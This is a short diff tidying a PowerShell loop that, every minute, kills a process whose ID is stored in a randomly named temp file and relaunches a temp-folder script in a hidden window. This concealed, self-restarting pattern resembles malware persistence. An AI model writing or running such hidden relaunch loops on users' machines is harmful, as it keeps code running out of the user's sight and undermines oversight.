@@ -3,17 +3,16 @@
 
 for(;;) {
     try {
-     # invoke the worker script
-     $proc = Get-Content "$env:temp/DdBPKCytRe"
-     Stop-process -id $proc -Force
-     powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/p.ps1"
+        # invoke the worker script
+        $proc = Get-Content "$env:temp/DdBPKCytRe"
+        Stop-Process -Id $proc -Force
+        Start-Process powershell.exe -WindowStyle Hidden "$env:temp/p.ps1"
     }
     catch {
-     # do something with $_, log it, more likely
+        # Log the error for debugging
+        Write-Host "Error: $_"
     }
    
     # wait for a minute
     Start-Sleep 60
-   }
-
-# sort the times in chronological order
+}
